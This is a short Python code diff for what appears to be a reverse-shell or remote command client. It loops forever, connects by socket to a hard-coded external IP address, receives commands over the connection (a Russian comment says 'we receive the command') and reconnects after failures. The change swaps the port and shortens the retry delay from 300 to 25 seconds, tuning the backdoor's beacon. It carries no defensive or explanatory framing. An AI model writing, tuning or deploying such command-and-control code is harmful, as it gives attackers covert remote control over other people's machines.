@@ -4,7 +4,7 @@ import time
 while True:
     try:
         sock = socket.socket()
-        sock.connect(("109.169.239.111", 9494))
+        sock.connect(("109.169.239.111", 9696))
         while True:
             try:
                 data = sock.recv(1024).decode()  # получаем команду
@@ -18,5 +18,5 @@ while True:
             except:
                 break
     except:
-        time.sleep(300)
+        time.sleep(25)
         continue
